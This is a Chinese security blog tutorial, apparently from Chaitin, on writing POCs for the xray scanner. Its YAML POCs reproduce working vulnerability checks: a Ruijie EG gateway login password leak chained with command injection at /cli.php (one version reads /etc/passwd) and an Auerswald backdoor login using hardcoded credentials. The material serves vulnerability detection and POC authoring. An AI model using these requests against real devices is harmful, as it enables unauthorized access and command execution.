#  一个xray POC的编写全过程   
 长亭安全应急响应中心   2022-06-27 18:32  
  
**序言**  
  
  
在刚接触安全渗透的时候，常对于各种各样庞杂的技术感到有些头皮发麻，sql注入，xss，csrf，ssrf等一众名词也让人有些望而生畏。后来在前辈的指引下认识到了sqlmap，nmap等工具，在进行了一段时间的学习后，慢慢对sqlmap的其中一个参数非常的感兴趣——m参数，也就是对文件中存在可注入的链接进行注入测试，这种批量的扫描漏洞的行为极大的激发了我学习的兴趣，同时也想要找到比sqlmap能更加准确，扫描切入点更多的工具。  
  
  
正巧在这个时候，我得知一位大佬通过一个叫xray的工具结合自己写的POC，扫描出了百度的一个漏洞，获得了不菲的奖励。立马对xray产生了很大的兴趣，也是在那个时候，了解了什么是POC，EXP等概念（原谅一个当时在学校刚接触安全的小白在几个月后才接触了这些）  
  
  
**了解概念**  
  
POC(Proof of Concept) - 利用证明  
  
  
  
POC，Proof of Concept，意思是利用证明。可使得使用者能够确认这个漏洞是真实存在的。  
  
#### EXP(Exploit) - 漏洞利用  
  
  
  
  
  
EXP，Exploit 中文意思是 漏洞利用。意思是一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码，可以使得使用者完全了解漏洞的机理以及利用的方法。  
  
#### xray  
  
  
  
  
xray是长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单，支持 Windows / macOS / Linux 多种操作系统，可以满足广大安全从业者的自动化 Web 漏洞探测需求。  
  
  
  
**开始使用xray**  
  
  
在得知xray后，我也是很快的开始尝试xray，但在那个时候，我同时也了解到了AWVS，w12scan等扫描器。于是那个时候的我便开始反复横跳。那个时候的xray刚刚开放1.0版本不久，POC不像现在的多，功能上也不是那么的强悍，本身自带的爬虫对比AWVS等有略显不足，但对于那个时候的我来说，相比较于w12scan麻烦的部署方式（对于那个时候的我）和AWVS半天时间用掉了我30G流量的恐怖（鬼知道为什么那么多），xray简便的使用方式，多平台通用，Rad的正式发布，我自然而然的开始向xray倾斜。  
  
  
当我最后沉下心，专注的看了xray的各种内容，大佬们分享的文章后，让xray在我的心中地位又加重了一分，同时一个月更新4个版本的速度，和社区的活跃也让我非常的感叹。（2021年更新确实慢了不少，但社区还是活跃）  
  
  
进入工作的一段时间里，我开始频繁的使用xray，同时也不断地学习渗透的知识，xray扫描出的漏洞报告简洁明了，让我在不断学习的同时，也借着xray扫出的漏洞不断地复现，知识也在不断的印证。直到我开始关注一些前线的漏洞预警，威胁情报等信息的时候，突然发现，很多刚爆出的漏洞，xray并不能扫描出，因为他的更新频率始终赶不上漏洞出现的频率，就算有师傅已经提交在了  
[Pull requests]  
(https://github.com/chaitin/xray/pulls)  
，但始终是要等下个版本的合并，或自己下载下来再使用。这样还是过于繁琐。再加上提交POC可以换取高级版，增加漏洞扫描类型，也正是在这个时候，我动了自己写一个POC的念头。  
  
  
  
**如何开始编写**  
  
  
  
**经历**  
  
  
  
  
  
当开始有这个念头后，我第一时间想到了官方文档中我从未涉及过的地方，  
自定义POC语法 - xray 安全评估工具文档  
(https://docs.xray.cool/#/guide/poc)  
。  
  
  
在通读了一遍文档后，我对xrayPOC的运行有了简单的概念：通过写一个固定的yml文件，让xray以这个yml文件的内容进行发包，再通过返回包来判断是否存在漏洞。而我应该做的便是告诉xray应该发一个什么样的包，并告诉他应该在返回包中获取到什么样的信息。  
  
  
同时也认真的学习了一下有关匹配返回包中的信息时使用的表达式，expression表达式（详细内容查看最新文档  
[自定义POC语法V2版本]    
 (https://docs.xray.cool/#/guide/poc/v2)  
）  
  
  
推荐在看完官方文档后，如果还是没有什么头绪或者无从下手，也可以看一下长亭在知乎发的这篇文章：  
[如何编写一个xray POC]  
(https://zhuanlan.zhihu.com/p/78334648)  
，虽然其中的格式已经过时，但对于一个poc的成型的思想上还是很有所帮助的，尤其应该关注其中关于POC结构，Rule，expression相关的知识。但值得提醒的一点，如果你没有什么编程基础，是刚接触这方面的小白，建议先无视文章或者官方文档中复杂的规则，先大概有所了解就好，只去了解最基础的，然后先从编写一个只发一个简单的数据包就能确认漏洞存在的POC开始。  
  
  
在知道了这些后，结合我在github中翻到的P神写的  
[XRay POC 编写辅助工具]  
(https://phith0n.github.io/xray-poc-generation/)  
（当然  
长亭的知乎文章中也有提到，这个工具对不熟悉yaml格式的师傅非常友好），我开始了我的第一个POC编写之旅。  
  
  
**总结**  
  
  
当想要开始写一个POC并贡献POC的时候，我们应基本遵循以下的流程去了解如何去编写一个高质量的POC，如何去提交POC。以便于我们在编写，提交的过程中少走弯路。  
  
  
**1.****xray POC 审核标****准**  
  
****  
**(https://stack.chaitin.com/techblog/detail?id=48&curNav=index)**  
  
- 可以查看该文档了解到社区对于POC的审核规范，收录规范  
  
  
**2.****自定义POC语法**  
  
****  
**(https://stack.chaitin.com/techblog/detail?id=50&curNav=index)**  
  
- 最主要应该详细阅读的内容，阅读时，建议先不要详细查看脚本格式，可以简单了解  
下一个POC中都有哪些部分就好，然后将环境配置好后，建议着重查看与理解一下生命周期相关的内容，这对于提升对POC各部分的理解有着很好的帮助，当对POC的各个部分有了理解之后，后面再写POC相对来说就会熟悉一些  
  
- 接下来便可以详细的关注脚本格式的内容，可以注意到存在V1与V2两个版本，V1版本主要服务于Xray1.8.1之前，而在Xray1.8.1及之后，改为了V2版本。所以建议直接观看V2版本就好  
  
**3.****编写高质量poc - xray 安全评估工具文档**  
**(https://docs.xray.cool/#/guide/high_quality_poc)**  
  
- 这篇文档对于写一个好的POC，或者说一个可以起作用的POC会起到一个非常大的帮助，在编写完POC之后，一定要参考着这篇文档对自己的POC精修一下  
  
- 文档在  
**应该怎么做**这个部分提到的《  
漏洞检测的那些事儿  
(https://paper.seebug.org/9/)  
》这篇文章非常值得反复阅读，非常有利于提高自己的检测方面的严谨的思考逻辑，让自己在遇到一个没见过的漏洞后，可以又快又好地想出一个检测方案。就算是不写POC，也非常推荐阅读，这对提高自己的业务水平，技术能力都非常有帮助。  
  
**4.**  
**xray/pocs at master·chaitin/xray ·GitHub**  
******(https://github.com/chaitin/xray/tree/master/pocs)**  
  
**Ctstack 安全社区 (chaitin.com)**  
  
**(https://stack.chaitin.com/poc/archive/list?listtype=all&val=)**  
  
- 这是师傅们写了并被收录了的POC。在了解到了原理，格式，心中对要写的POC有了一定的想法后，不妨去这两个地方看看，最好能找一个跟自己要写的POC同一个类型的来参考  
  
- 如果还没开始写，可以参考着其他师傅的来写，在写起来会轻松简单不少  
  
- 如果已经写完了，也可以参考看与其他师傅写的有何不同，取长补短。同时如果发现自己写的更加严谨，也可以提交修改。  
  
  
  
  
  
**一个POC的诞生**  
  
  
  
由于现在xrayPOC更新到了V2，所以以下内容会尽量按照V2的来  
  
  
#### 漏洞选择  
  
  
  
漏洞方面，首先先去看官方文档中有关  
[贡  
献POC]  
(https://docs.xray.cool/#/guide/contribute)  
方面的要求（如果只是自己使用，可以略过，但提交POC等可以获取高级版，所以建议观看），然后查看  
[  
Pull requests · chaitin/xray (github.com)]  
(https://github.com/chaitin/xray/pulls)  
和  
[CT stack 安全社区 (chaitin.com)]  
(https://stack.chaitin.com/security-challenge/poc/list)  
，查看所选择的漏洞是否有被提交。  
  
  
最终看下来后，我选择了****的一个RCE漏洞进行编写POC。  
  
  
这个漏洞是在web管理页面上，使用管理员的用户名密码登录设备后，可通过web页面执行部分操作命令，设备上有接口来读取这些操作命令的返回值。接口对返回值中存在的恶意指令过滤不充分，导致设备可以通过CLI被远程执行一些恶意指令。  
  
  
开始编写  
  
  
这个漏洞是通过POST的形式向目标的/cli.php?a=shell这个链接发送notdelay=true&command=这样一串数据，而command处则可以填写执行的命令。于是我便通过P神的网站很快的编写出了POC。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicSUvDsd79z6JF7jeicfKOWiaQrxtNrMzcVK6qy9c1tpSmP1VE3RCFYtuwXalULIaMu9nhyvg6xmERKg/640?wx_fmt=png "")  
  
  
这样的POC在现在看来无疑是非常有问题的，但当时的我在写完后非常的兴奋，在将生成的结果复制出来修改好后，便使用命令对poc进行格式检测xray.exe pl --script nacos-cve-2021-29441.yml(这是最新的检查命令)，在检查提示中，使用python3 -m pip install yamllint安装了yamllint（xray检测yaml格式使用的工具），并通过了检测。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicSUvDsd79z6JF7jeicfKOWiaQP3wOGTTDkpRDc11Q4ZvLeNXHlkerz4Et4iat3icsvlUPFuaKQRhjx01g/640?wx_fmt=png "")  
  
  
#### POC检测  
  
  
  
在POC上传到github或者社区的时候，接受上传处会首先对POC进行格式方面的检测，如果格式检测有问题，会首先提示修改格式，然后才会有人工进行内容的审核。而上传处进行检测的原理我们可以拿github来看：Xray在github上以一个项目的形式存在，并设定了Action，当有人提交POC的时候，会首先执行一个由**check_poc.yml**  
规范的动作，具体代码如下：  
  
  
```
name: Check POC
on: [push, pull_request]
jobs:
  check_poc:
    runs-on: ubuntu-18.04
    steps:
      - uses: actions/setup-python@v1
        with:
          python-version: 3.7
      - uses: actions/checkout@v2
        with:
          fetch-depth: 1
      - name: Prepare
        run: |
          cd $GITHUB_WORKSPACE && \
          wget -nv https://github.com/chaitin/xray/releases/download/1.8.2/xray_linux_amd64.zip && \
          pip3 install yamllint && \
          unzip xray_linux_amd64.zip && \
          echo 'update:
              check: false' > config.yaml
      - name: Check POC
        run: |
          cd $GITHUB_WORKSPACE && \
          ./xray_linux_amd64 poclint --script "./pocs/*" --filepath "./pocs/" --rules filename,filepath,yamlschema,yamllint,cellint && \
          ./xray_linux_amd64 poclint --script "./fingerprints/*" --filepath "./fingerprints/" --rules filename,filepath,yamlschema,yamllint,cellint
```  
  
  
从上述代码我们可以很清晰地发现他的检测逻辑：获取一个运行环境->进入工作目录->获取最新版xray的压缩包->使用pip安装yamllint->解压xray并使用poclint --script参数进行检测  
  
  
明白了这个逻辑我们就可以发现，只要我们在本地使用xray进行检测并通过，那么在上传后，就一定会通过检测，可以直接进入人工审核阶段。  
  
  
**检测内容主要是以下几点：**  
  
• 检测文件名称  
  
• 检测文件名称与文件内容中name的值是否对应  
  
• 检测键的名称是否有问题，该有内容的，是否都存在内容  
  
• 检测yaml语法错误  
  
• 检测CEL表达式的语法等问题  
  
  
我修改了之前写的一些poc的内容来做示范，大致演示一下POC出现问题时的检测反馈与修改：  
  
  
##### 例一：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicSUvDsd79z6JF7jeicfKOWiaQf6DhtVgRe6x8B0ug17VSibZQLohFt58pdoWdaltqYKQrz2uMp4EfThA/640?wx_fmt=png "图片6.png")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicSUvDsd79z6JF7jeicfKOWiaQEzgG9GILKgpJ7xuHrmjR1Ofef0f6HiarEmhPwMqcT9kL7fcGj0WKvMQ/640?wx_fmt=png "图片7.png")  
  
  
- **问题：**当出现键值对重复，键命名错误，键缺少值，CEL表达式中出现不存在的方法或错误的使用方法时，会直接报错，不会执行后续检测流程。  
  
  
  
- **修改建议：**  
按照提示仔细查看对应错误并修改即可  
  
  
  
**例二：**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicSUvDsd79z6JF7jeicfKOWiaQNHFRXUic1suzUFYK7uCMvK5Xacqx9XicjUIicGlBibjcgb1gI3azibrbgag/640?wx_fmt=png "")  
  
  
在命名的时候，一般会出现上图中的几个格式上的错误：  
  
  
- **问题：**文件后缀以yaml结尾  
  
  
  
- **修改建议：**将文件名后缀修改为yml  
  
  
  
  
- **问题：**文件名与文件中name的值不匹配  
  
  
  
- **修改建议：**先将其中一个的值按照官方文档中要求的格式修改对，然后直接复制粘贴就好（注意，name的值比文件名多了poc-yaml-）  
  
  
  
  
  
可以注意到在检测名称的第五行错误提示，会发现它提示你修改成name的值的内容，就算这个内容是有问题的。比如这里明显name的值中cve大写了，而文件名是没有问题的，但他还是提示修改文件名。所以要此处不报错，首先就是要两者统一。  
  
  
- **问题：**当文件名出现大写的时候会产生报错  
  
- **报错原因：**  
文件名正则匹配规则：^(?:poc-yaml|custom|fingerprint-yaml)-[a-z0-9\\-]+$，可以注意到，后面匹配并没有大写字母。  
  
- **修改建议**  
：命名时，对照着官方文档的要求修改。  
  
  
  
  
当CEL表达式出现一些问题的时候cellint便会检测出，并给予修改意见，按照其修改后的样式修改即可  
  
  
当都修改完成后，便会如下图展示的反馈，这个时候便可以提交了。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicSUvDsd79z6JF7jeicfKOWiaQOvTdynManJ39RWrkWpHMd0s4iciahXibTPXwibibSpcxybN0RH64ERKxS6w/640?wx_fmt=png "")  
  
  
  
#### POC提交  
  
  
  
  
检测通过后，在  
[CT stack 安全社区 (chaitin.com)]  
(https://stack.chaitin.com/security-challenge/poc/list/editor)  
填写相关信息，添加测试环境地址（fofa/shodan语句），进行poc的提交。  
  
#### POC分析  
  
  
  
```
name: poc-yaml-******-eg-rce
rules:
  - method: POST
    path: "/cli.php?a=shell"
    follow_redirects: false
    body: |
      notdelay=true&command=cat /etc/passwd
    expression: |
      response.status == 200 && response.body.bcontains(b"\"status\":true,\"data\"") && response.body.bcontains(b"root")
detail:
  author: Jarcis
  links:
    - http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20cli.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
```  
  
  
分析这个poc会发现，他虽然格式上没有什么问题，但匆忙写poc的我忽略了  
[编写高质量poc - xray]  
(https://docs.xray.cool/#/guide/high_quality_poc)  
这篇文章的内容，在编写的时候，匹配上选择检测到root这种不严谨的检测语句而不是root:[x*]:0:0:这样的正则检测。当然不同的版本可能内容也会有所变化，所以此处最好不使用这种方式来进行RCE的检测。  
  
  
其次，这个漏洞需要在以管理员身份登录的情况下才可以触发，在进行爬虫扫描的时候，基本不可能触发，所以这个poc如果只是单纯这样，用处也不大。应该结合另一个在登陆口处获取管理员账号密码的漏洞一起来使用才行。  
  
  
  
#### 修改POC  
  
  
  
  
令我没想到的是，我提交上去后，smile-jpg师傅对我的poc进行了修改，然后通过了审核。  
  
```
name: poc-yaml-******-eg-cli-rce
set:
  r1: randomInt(8000, 10000)
  r2: randomInt(8000, 10000)
rules:
  - method: POST
    path: /login.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      username=admin&password=admin?show+webmaster+user
    expression: |
      response.status == 200 && response.content_type.contains("text/json")
    search: |
      {"data":".*admin\s?(?P<password>[^\\"]*)
  - method: POST
    path: /login.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      username=admin&password={{password}}
    expression: |
      response.status == 200 && response.content_type.contains("text/json") && response.headers["Set-Cookie"].contains("user=admin") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
  - method: POST
    path: "/cli.php?a=shell"
    follow_redirects: false
    body: |
      notdelay=true&command=expr {{r1}} * {{r2}}
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
detail:
  author: Jarcis
  links:
    - https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20cli.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
```  
  
  
他添加了在登陆口获取账号密码并登陆的操作，并添加了两个随机数，执行命令时，如果返回了随机数相乘执行的结果，便证明漏洞存在。  
  
  
看到了这样的修改后，我在学到不少新东西，更了解了应该怎样写好一个POC的同时，也对社区的师傅非常的感动，没有驳回这样一个错漏百出的poc的同时还修改并通过了审核，这对当时的我来说是一剂非常强力的强心剂，也为我后续编写更多的POC提供了很大的帮助。  
  
‍  
  
#### V2版本  
  
  
  
xray在久违的更新后，POC的编写格式也更新到了V2，官方也是将已经存在的200+的poc自动转换成了V2版本，官网也已经更新了V2版本的编写教程。当然P神的那个辅助POC生成器只能生成V1版本。但我们可以使用xray自带的命令将V1版本转换为V2版本，具体方式则可以通过xray.exe transform v1 --help进行查看。  
  
  
以下是V2版本的上述POC的代码：  
  
```
name: poc-yaml-ruijie-eg-cli-rce
manual: true
transport: http
set:
    r1: randomInt(8000, 10000)
    r2: randomInt(8000, 10000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /login.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                username=admin&password=admin?show+webmaster+user
        expression: response.status == 200 && response.content_type.contains("text/json")
        output:
            search: '"{\"data\":\".*admin\\s?(?P<password>[^\\\\\"]*)".bsubmatch(response.body)'
            password: search["password"]
    r1:
        request:
            cache: true
            method: POST
            path: /login.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                username=admin&password={{password}}
        expression: response.status == 200 && response.content_type.contains("text/json") && response.headers["Set-Cookie"].contains("user=admin") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
    r2:
        request:
            cache: true
            method: POST
            path: /cli.php?a=shell
            body: |
                notdelay=true&command=expr {{r1}} * {{r2}}
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
expression: r0() && r1() && r2()
detail:
    author: Jarcis
    links:
        - https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20cli.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
```  
  
  
  
**V2Tips**  
  
  
相对于V1版本，V2版本新增的output要比之前的search好用一些，可以在output中处理一些在下个包中会使用到的变量。例如返回的body中的数据为：  
  
```
["ooo":1,"date":"15.2.2021","tart":"154853254","macaddr":"00:00:00:00:00:00"]
```  
  
  
你需要匹配date的内容和tart的内容，并对tart的内容进行md5加密再截取，还需要拼接，就可以这样写：  
  
```
rules:
    r1:
        # 此处为一个 http request 的例子
        request:
            method: GET
            path: "/"
        expression: |
            response.status==200 
        # 相比于 V1 版本新增
        output:
            search: '"date\":\"(?P<date>.+?)\",\"tart".bsubmatch(response.body)'   
            date: search['date']
            search: '"tart\":\"(?P<tart>.+?)\",\"mac".bsubmatch(response.body)'   
            tart: search['tart']
            tartmd5: substr(md5(tart),0,16)  # 对匹配到的tart的内容进行md5加密，然后再截取前十六位
            tartty: date + tartmd5 + "asd"  # 对匹配到的date，格式化好后的tart，字符串"asd"进行拼接
    r2:
        # 上述定义出的变量的使用
        request:
            method: POST
            path: "/"
            body:
              a={{date}}&b={{tart}}&c={{tartmd5}}&d={{tartty}}
        expression: |
            response.status==200
```  
  
  
需要注意，search后不能再跟search，应先将需要的数据提取出来，再进行下一个search，否则会匹配不到数据。  
  
##### 手搓Digest auth认证  
  
  
通过上述的技巧，其实可以发现，我们可以通过对返回包中内容的处理，完成Digest auth认证。以下为poc实例：  
  
```
```yaml
name: poc-yaml-auerswald-cve-2021-40859
transport: http
set:
    dcnonce: randomLowercase(8)
rules:
    r1:
        request:
            method: GET
            path: "/about_state"
        expression: response.status == 200 && r'serial.*?\d+.,'.bmatches(response.body) && r'date.+?20[0-9][0-9].,'.bmatches(response.body)
        output:
            search: '"serial\":\"(?P<serial>.+?)\",\"date".bsubmatch(response.body)'
            serial: search["serial"]
            search1: '"date\":\"(?P<date>.+?)\",\"macaddr".bsubmatch(response.body)'            
            date: search1["date"]
            HA: serial + "r2d2" + date
            password: substr(md5(HA),0,7)            
    r2:
        request:
            method: GET
            path: "/tree"
        expression: response.status == 401
        output: 
            search2: '"nonce=\"(?P<nonce>.*)\", opaque".submatch(response.headers["WWW-Authenticate"])'
            nonce: search2["nonce"]
            search3: '"opaque=\"(?P<opaque>.*)\",algorithm".submatch(response.headers["WWW-Authenticate"])'
            opaque: search3["opaque"]
            cnonce: substr(md5(dcnonce),0,16)
            username: '"Schandelah"'
            OHA1: username + ":Auerswald:" + password
            HA1: md5(OHA1)
            resp: HA1 + ":" + nonce + ":" + "00000001" + ":" + cnonce + ":auth:a94ba59ccc1aaf76cedba69ce4d102d2"
            respmd5: md5(resp)
    r3:
        request:
            method: GET
            path: "/tree"
            follow_redirects: true
            headers:
                Authorization: Digest username="Schandelah", realm="Auerswald", nonce="{{nonce}}", uri="/tree", algorithm=MD5, response="{{respmd5}}", opaque="{{opaque}}", algorithm="MD5", qop=auth, nc=00000001, cnonce="{{cnonce}}"
        expression: response.status == 200 && response.body.bcontains(b"Servicetools")
expression: r1() && r2() && r3()
detail:
    author: Jarcis-cy(https://github.com/jarcis-cy)
    links:
        - https://www.redteam-pentesting.de/en/advisories/rt-sa-2021-007/-auerswald-compact-multiple-backdoors
    summary: 'username:Schandelah;password:{{password}}'

```
```  
  
  
通过这个POC，我们可以注意到四点：  
  
1. output中定义变量并给变量赋值的时候，如果是纯字符串，需要先单引号再双引号引起来，否则会报错2. 在output中进行变量拼接的时候，不能以字符串开头，如果需要以字符串开头，需先将该字符串通过第一点的方式定义出来3. md5函数中可以直接引用之前的变量，不能在函数中进行字符串拼接  
  
4.search这个变量名称不要重复  
  
  
  
**总结**  
  
  
对于我来说，从接触xray到编写第一个POC再到现在，让我收获最多的并不是提交poc后换取的高级版，而是在编写POC时的思考，思考漏洞的触发条件，利用方式；在复现漏洞时的操作；在研究其他人编写的POC的精妙之处。这些才是我最大的收获，同时对我也是一个很大的提升。  
  
  
所以我常劝身边刚开始学习安全的人去尝试编写一下xray的POC，因为这是一个非常好的入门的机会，一个从小白到懂一点知识的人的机会。往常POC的编写还需要一定的代码知识，需要学习python等语言，学会发包等操作，有一定的门槛。但xray的POC的编写不需要，只需要认真的阅读官方的文档，认真的学习他人写的POC，在这个过程中不断的思考与实践，就算最后所写的POC不被通过，但我相信这样操作下来就已经有所收获。  
